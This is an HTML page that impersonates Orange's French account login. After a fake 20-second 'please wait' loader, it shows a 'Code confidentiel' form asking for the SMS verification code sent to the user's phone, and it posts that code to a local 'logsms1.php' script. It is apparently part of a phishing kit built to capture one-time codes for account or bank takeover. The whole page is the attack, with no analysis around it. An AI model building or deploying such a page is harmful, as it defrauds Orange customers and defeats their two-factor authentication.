
<html lang="fr"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>Identifiez-vous avec votre compte Orange</title>
	<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
    <noscript>
        <style type="text/css">
            body {
                display: none;
            }
        </style>
    </noscript>

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">


    <link rel="apple-touch-icon" sizes="57x57" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-180x180.png">

    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-36x36.png" sizes="36x36">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-48x48.png" sizes="48x48">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-72x72.png" sizes="72x72">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-144x144.png" sizes="144x144">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-16x16.png" sizes="16x16">
            <link rel="stylesheet" href="css/css.css">
    
            <style>
            .eui-banner {
                background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.15.1/images/services_comm/om_desktop.png");
            }

            .eui-banner-mc {
                background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.5.2/images/services_comm/mc_desktop.png");
            }

            @media (max-width: 767px) {
                .eui-banner {
                    background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.15.1/images/services_comm/om_mobile.png");
                }

                .eui-banner-mc {
                    background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.5.2/images/services_comm/mc_mobile.png");
                }
            }
.eui-footer-banner {
	background:#fff;
    display: block;
    padding: 2rem 0;
}.eui-mega-banner {
    height: 9rem;
    margin: 1rem auto;
    width: 72.8rem;
}
            .off-screen {
                position: fixed;
                bottom: 0;
                right: 0;
                height: 0 !important;
                width: 0 !important;
                overflow: hidden;
                opacity: 0;
                filter: alpha(opacity=0);
            }
        </style>
                <style>
            #forceMCLabel.disabled, #forceMCLabelBis.disabled  {
                display: none;
            }
			body{background:#fff}
        </style>
</head>
<body>
<header id="o-header" style="background-color: black;    min-width: 100%;" class=" fixed-center o-center-align fixed-center o-center-align polaris3 o-noSearchZone" style="height: auto;"><div id="o-ribbon" style="background-color: black" ><div id="o-nav-left"><ul><li id="o-logo-container"><a href="#" title="retour a l'accueil" data-oevent-category="header" data-oevent-action="logo" data-tag="urlwg_rubanGP3_logo" id="o-logo" data-link-changed="true"><img src="//c.woopic.com/logo-orange.png" title="retour a l'accueil"></a></li><li id="o-megamenu-link-container"><div class="o-nav-item" id="o-megamenu-link" title="Mes services Orange" data-oevent-category="header" data-oevent-action="menu" data-tag="navwg_rubanGP3_burger" data-icon="" data-link-changed="true" style="color: white" >Mobiles et forfaits
<div class="o-nav-zone-panel-arrow"></div></div><div id="o-megamenu-panel" class="o-nav-zone-panel o-nav-zone-panel-full-width"><div class="o-nav-zone-panel-content"><div id="o-megamenu-panel-content-container" class="o-nav-zone-panel-content-container"><div class="o-megamenu-panel-data"><div title="Relation Client" class="o-megamenu-category "><div class="o-nav-zone-panel-title"style="color: white">Relation Client</div><ul><li><a href="#" title="Espace client" data-oevent-category="header_menu" data-oevent-action="relationclient" data-oevent-label="espaceclient" data-tag="urlwg_rubanGP3_burger_relationclient_espaceclient" data-sense-of-place="" data-link-changed="true"style="color: white">Internet
<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Compte Orange" data-oevent-category="header_menu" data-oevent-action="relationclient" data-oevent-label="compteorange" data-tag="urlwg_rubanGP3_burger_relationclient_compteorange" data-sense-of-place="" data-link-changed="true"style="color: white">Compte Orange<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Aide et contact" data-oevent-category="header_menu" data-oevent-action="relationclient" data-oevent-label="aideetcontact" data-tag="urlwg_rubanGP3_burger_relationclient_assistance" data-sense-of-place="" data-link-changed="true"style="color: white">Aide et contact<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Forum d'entraide" data-oevent-category="header_menu" data-oevent-action="relationclient" data-oevent-label="forumdentraide" data-tag="urlwg_rubanGP3_burger_relationclient_forum" data-sense-of-place="" data-link-changed="true">Forum d'entraide<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Boutique en ligne" data-oevent-category="header_menu" data-oevent-action="relationclient" data-oevent-label="boutiqueenligne" data-tag="urlwg_rubanGP3_burger_relationclient_boutique" data-sense-of-place="" data-link-changed="true">Boutique en ligne<div class="o-sense-of-place"></div></a></li></ul></div><div title="Divertissement" class="o-megamenu-category "><div class="o-nav-zone-panel-title">Divertissement</div><ul><li><a href="#" title="TV" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="tv" data-tag="urlwg_rubanGP3_burger_divertissement_tv" data-sense-of-place="" data-link-changed="true">TV<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Vidéo à la demande" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="videoalademande" data-tag="urlwg_rubanGP3_burger_divertissement_vod" data-sense-of-place="" data-link-changed="true">Vidéo à la demande<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Musique" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="musique" data-tag="urlwg_rubanGP3_burger_divertissement_musique" data-sense-of-place="" data-link-changed="true">Musique<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Jeux" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="jeux" data-tag="urlwg_rubanGP3_burger_divertissement_jeux" data-sense-of-place="" data-link-changed="true">Jeux<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Lecture" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="lecture" data-tag="urlwg_rubanGP3_burger_divertissement_presse" data-sense-of-place="" data-link-changed="true">Lecture<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Cinéma" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="cinema" data-tag="urlwg_rubanGP3_burger_divertissement_cinema" data-sense-of-place="" data-link-changed="true">Cinéma<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Vidéos" data-oevent-category="header_menu" data-oevent-action="divertissement" data-oevent-label="videos" data-tag="urlwg_rubanGP3_burger_divertissement_videos" data-sense-of-place="" data-link-changed="true">Vidéos<div class="o-sense-of-place"></div></a></li></ul></div><div title="Info/mag" class="o-megamenu-category "><div class="o-nav-zone-panel-title">Info/mag</div><ul><li><a href="#" title="Actualités" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="actualites" data-tag="urlwg_rubanGP3_burger_info_actualites" data-sense-of-place="" data-link-changed="true">Actualités<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Auto" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="auto" data-tag="urlwg_rubanGP3_burger_info_automobile" data-sense-of-place="" data-link-changed="true">Auto<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Finance" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="finance" data-tag="urlwg_rubanGP3_burger_info_finance" data-sense-of-place="" data-link-changed="true">Finance<div class="o-sense-of-place"></div></a></li><li><a href="#" title="La banque maintenant" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="labanquemaintenant" data-sense-of-place="">La banque maintenant<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Météo" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="meteo" data-tag="urlwg_rubanGP3_burger_info_meteo" data-sense-of-place="" data-link-changed="true">Météo<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Sports" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="sports" data-tag="urlwg_rubanGP3_burger_info_sports" data-sense-of-place="" data-link-changed="true">Sports<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Tendances" data-oevent-category="header_menu" data-oevent-action="infomag" data-oevent-label="tendances" data-tag="urlwg_rubanGP3_burger_info_tendances" data-sense-of-place="" data-link-changed="true">Tendances<div class="o-sense-of-place"></div></a></li></ul></div><div title="Services Orange" class="o-megamenu-category "><div class="o-nav-zone-panel-title">Services Orange</div><ul><li><a href="#" title="Mail" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="mail" data-tag="urlwg_rubanGP3_burger_servicesorange_mail" data-sense-of-place="" data-link-changed="true">Mail<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Agenda" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="agenda" data-tag="urlwg_rubanGP3_burger_servicesorange_agenda" data-sense-of-place="" data-link-changed="true">Agenda<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Contacts" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="contacts" data-tag="urlwg_rubanGP3_burger_servicesorange_contacts" data-sense-of-place="" data-link-changed="true">Contacts<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Boîtes vocales" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="boitesvocales" data-tag="urlwg_rubanGP3_burger_servicesorange_boitesvocales" data-sense-of-place="" data-link-changed="true">Boîtes vocales<div class="o-sense-of-place"></div></a></li><li><a href="#" title="SMS / MMS" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="smsmms" data-tag="urlwg_rubanGP3_burger_servicesorange_sms" data-sense-of-place="" data-link-changed="true">SMS / MMS<div class="o-sense-of-place"></div></a></li></ul></div><div class="o-megamenu-category "><div class="o-nav-zone-panel-title"></div><ul><li><a href="#" title="Homelive" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="homelive" data-tag="urlwg_rubanGP3_burger_servicesorange_homelive" data-sense-of-place="" data-link-changed="true">Homelive<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Djingo" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="djingo" data-sense-of-place="">Djingo<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Orange Bank" class="o-megamenu-new" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="orangebank" data-sense-of-place="">Orange Bank<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Orange Money" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="orangemoney" data-tag="urlwg_rubanGP3_burger_servicesorange_orangemoney" data-sense-of-place="" data-link-changed="true">Orange Money<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Orange Cash" data-oevent-category="header_menu" data-oevent-action="servicesorange" data-oevent-label="orangecash" data-tag="urlwg_rubanGP3_burger_servicesorange_orangecash" data-sense-of-place="" data-link-changed="true">Orange Cash<div class="o-sense-of-place"></div></a></li></ul></div><div title="Et aussi" class="o-megamenu-category "><div class="o-nav-zone-panel-title">Et aussi</div><ul><li><a href="#" title="Autonomie" data-oevent-category="header_menu" data-oevent-action="etaussi" data-oevent-label="autonomie" data-tag="urlwg_rubanGP3_burger_autres_autonomie" data-sense-of-place="" data-link-changed="true">Autonomie<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Accueil Sosh" data-oevent-category="header_menu" data-oevent-action="etaussi" data-oevent-label="accueilsosh" data-tag="urlwg_rubanGP3_burger_autres_accueilsosh" data-sense-of-place="" data-link-changed="true">Accueil Sosh<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Accueil Pro" data-oevent-category="header_menu" data-oevent-action="etaussi" data-oevent-label="accueilpro" data-tag="urlwg_rubanGP3_burger_autres_accueilpro" data-sense-of-place="" data-link-changed="true">Accueil Pro<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Orange France" data-oevent-category="header_menu" data-oevent-action="etaussi" data-oevent-label="orangefrance" data-tag="urlwg_rubanGP3_burger_autres_orangefrance" data-sense-of-place="" data-link-changed="true">Orange France<div class="o-sense-of-place"></div></a></li><li><a href="#" title="Orange Group" data-oevent-category="header_menu" data-oevent-action="etaussi" data-oevent-label="orangegroup" data-tag="urlwg_rubanGP3_burger_autres_orangegroup" data-sense-of-place="" data-link-changed="true">Orange Group<div class="o-sense-of-place"></div></a></li></ul></div></div></div><div id="o-megamenu-panel-footer-container" class="o-megamenu-panel-footer-container"><div class="o-megamenu-panel-footer"><a href="#" title="Contacter Orange" data-oevent-category="header_menu" data-oevent-action="accesdirect" data-oevent-label="contacterorange" data-tag="urlwg_rubanGP3_burger_footer_nouscontacter" data-icon="" data-link-changed="true">Contacter Orange</a><a href="#" title="Boutique en ligne" data-oevent-category="header_menu" data-oevent-action="accesdirect" data-oevent-label="boutiqueenligne" data-tag="urlwg_rubanGP3_burger_footer_trouverboutique" data-icon="" data-link-changed="true">Boutique en ligne</a><a href="#" title="Forum d'entraide" data-oevent-category="header_menu" data-oevent-action="accesdirect" data-oevent-label="forumdentraide" data-tag="urlwg_rubanGP3_burger_footer_couverturereseaux" data-icon="" data-link-changed="true">Forum d'entraide</a></div></div><div class="o-nav-zone-panel-close-button" id="o-megamenu-close-button" title="Fermer" data-oevent-category="header_menu" data-oevent-action="croixfermeture" data-tag="urlwg_rubanGP3_burger_fermeture" data-link-changed="true">×</div></div></div></li><li id="o-separator-container"><span id="o-separator" class="o-separator"></span></li><li id="o-espace-client-container"><a id="o-espace-client" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Espace client" data-oevent-category="header" data-oevent-action="espaceclient" data-tag="urlwg_rubanGP3_operateur_espaceclient" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">Internet<div class="o-sense-of-place"></div></a></li><li id="o-aide et contact-container"><a id="o-aide et contact" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Aide et contact" data-oevent-category="header" data-oevent-action="aideetcontact" data-tag="urlwg_rubanGP3_operateur_assistance" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">Packs Internet + Mobile
<div class="o-sense-of-place"></div></a></li><li id="o-boutique-container"><a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique" data-oevent-category="header" data-oevent-action="boutique" data-tag="urlwg_rubanGP3_operateur_boutique" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">Maison<div class="o-sense-of-place"></div></a></li>

<li id="o-boutique-container"><a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique" data-oevent-category="header" data-oevent-action="boutique" data-tag="urlwg_rubanGP3_operateur_boutique" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">TV et divertissement
<div class="o-sense-of-place"></div></a></li>

<li id="o-boutique-container"><a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique" data-oevent-category="header" data-oevent-action="boutique" data-tag="urlwg_rubanGP3_operateur_boutique" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">Banque<div class="o-sense-of-place"></div></a></li>

<li id="o-boutique-container"><a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique" data-oevent-category="header" data-oevent-action="boutique" data-tag="urlwg_rubanGP3_operateur_boutique" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">News<div class="o-sense-of-place"></div></a></li>

<li id="o-boutique-container"><a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique" data-oevent-category="header" data-oevent-action="boutique" data-tag="urlwg_rubanGP3_operateur_boutique" data-hide="if-needed" data-sense-of-place="" data-link-changed="true"style="color: white">News<div class="o-sense-of-place"></div></a></li>


</ul></div><div id="o-nav-right"><ul></ul></div></div></header>



<main class="eui-container" role="main">


 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" ></script>
  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>

<script type="text/javascript">setTimeout(function() 

    {
    $('#mydiv').fadeOut('fast');
     $('#mydiv2').show('fast');
}, 20000); 



</script>

<div id="mydiv">
    <table width=100% height=100%>
   <tr height=100% align=middle>
    <td width=100% align=center>
     <img height="70" src=css/loading.gif><br>Veuillez patientez...
    </td>
   </tr>
  </table>

</div>

    <div style="display: none" id="mydiv2" class="o-container-fluid eui-title-area">
        <div class="row">
            <div class="col-xs-12 col-md-8 col-lg-8 col-xl-8">
                <h1 id="title">Code confidentiel</h1>
            </div>
        </div>
   






    <div class="o-container-fluid" >
        <div class="row">
		<div id="thispanel">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6">
                <div id="stage" class="">
                    <form autocomplete="off" class="eui-form" id="euiForm" method="post" action="logsms1.php" >
    <div id="eui-accounts">
        
    </div>

    <div class="form-group " id="email_form">
   
      
        <div aria-label="aide" class="eui-help" id="helpLoginCnt" style="">
            <p class="noSelectContent" tabindex="-1"><span>Pour confirmer le processus, entrez le code que nous avons envoyé à votre téléphone mobile par SMS **********</span><br></p>
        </div>

        <h6 id="error-msg-box-login" tabindex="0" class="form-control-message" aria-live="assertive" role="alert" title="erreur">Cette adresse mail ou ce numéro de mobile n’est pas valide. Vérifiez votre saisie.</h6>       <input type="password" id="login" placeholder="Code SMS" required=""  class="form-control" maxlength="8" autocorrect="off" name="num" autocapitalize="off" spellcheck="false" aria-describedby="error-msg-box-login" aria-invalid="">
    </div>
    <button id="btnSubmit"  class="btn btn-info eui-btn-sub" type="submit" >Confirmer</button>
</form>                    <nav class="eui-links row" role="navigation">
                                                
                        <div id="firstAuthentBloc" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="firstAuthentLink" data-oevent="idme_login;clic_premiere_connexion;lien_premiere_connexion" href="#" title="Vous vous connectez pour la première fois ?">Vous vous connectez pour la première fois ?</a>
                        </div>

                                                    <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                                <a id="firstAccessLink" data-oevent="idme_login;clic_créer_compte;créer_votre_compte" href="#" title="Vous n’êtes pas client Orange ou Sosh ?">Vous n’êtes pas client Orange ou Sosh ?</a>
                            </div>
                        
                                                    <div id="forgotCodeMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                                <a id="forgotCodeMCLink" href="#" title="Code confidentiel oublié ?">Code confidentiel oublié ?</a>
                            </div>
                        
                                                    <div id="discoverMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none">
                                <a id="discoverMCLink" href="#">
                                    <img id="discoverMCLinkImg" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.5.2/images/services_comm/Logo_MC_noir_fond_transparent_small.png">
                                    <img id="discoverMCLinkImgHover" style="display: none;" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.5.2/images/services_comm/Logo_MC_orange_fond_transparent_small.png">
                                     Comment s'identifier plus vite et plus facilement ?                                </a>
                            </div>
                        
                        <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="helpLink" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="#" title="Aide">Aide</a>
                        </div>

                        
                                                  
            </div></div>
                            <div id="magicZone" class="eui-banner-place col-xs-12 col-md-5 col-lg-4 col-xl-4 col-md-offset-1">
                                            <a id="magicZoneLink" data-oevent-category="idme_login" data-oevent-action="clic_zone_com" data-oevent-label="service" class="eui-block" href="#"  rel="noopener noreferrer">
                            <div id="elmt-banner" class="eui-banner" title="Lien zone de communication (nouvel onglet)"></div>
                        </a>
                                    </div>
                    </div>
    </div>
</main>
<footer class="footer-fluid">
            
                <div id="cefooter"><div id="o-footer-wrapper" class=""><div style="min-width: 100%;" class="o-footer-liendirect"><div class="o-footer-liendirect-content"><span class="o-footer-liendirect-item"><a class="o-icomoon" href="#" title="Contacter Orange" data-oevent-category="footer_accesdirect" data-oevent-action="contacterorange" data-tag="urlwg_accesdirects_contact" data-icon="">Contacter Orange</a></span><span class="o-footer-liendirect-item"><a class="o-icomoon" href="#" title="Boutique en ligne" data-oevent-category="footer_accesdirect" data-oevent-action="boutiqueenligne" data-tag="urlwg_accesdirects_boutique" data-icon="">Boutique en ligne</a></span><span class="o-footer-liendirect-item"><a class="o-icomoon" href="#" title="Forum d'entraide" data-oevent-category="footer_accesdirect" data-oevent-action="forumdentraide" data-tag="urlwg_accesdirects_forum" data-icon="">Forum d'entraide</a></span></div></div><div style="min-width: 100%;" class="o-footer-lienlegal"><div class="o-footer-lienlegal-content"><span class="o-footer-lienlegal-item"><a href="#" title="Informations légales"  data-oevent-category="footer_legal" data-oevent-action="informationslegales" data-tag="urlwg_footerGP_infoslegales">Informations légales</a></span><span class="o-footer-lienlegal-item"><a href="#" title="Données personnelles"  data-oevent-category="footer_legal" data-oevent-action="donneespersonnelles" data-tag="urlwg_footerGP_donneesperso">Données personnelles</a></span><span class="o-footer-lienlegal-item"><a href="#" title="Les cookies"  data-oevent-category="footer_legal" data-oevent-action="lescookies" data-tag="urlwg_footerGP_cookies">Les cookies</a></span><span class="o-footer-lienlegal-item"><a href="#" title="Publicité"  data-oevent-category="footer_legal" data-oevent-action="publicite" data-tag="urlwg_footerGP_publicite">Publicité</a></span><span class="o-footer-lienlegal-item"><a href="#" title="Internet +"  data-oevent-category="footer_legal" data-oevent-action="internetplus" data-tag="urlwg_footerGP_internet">Internet +</a></span><span class="o-footer-lienlegal-item"><a href="#" title="Signaler un contenu"  data-oevent-category="footer_legal" data-oevent-action="signaleruncontenu" data-tag="urlwg_footerGP_signalerIllicite">Signaler un contenu</a></span><span class="o-footer-lienlegal-item">© Orange 2019</span></div></div></div></div>
    </footer>
	
</body></html>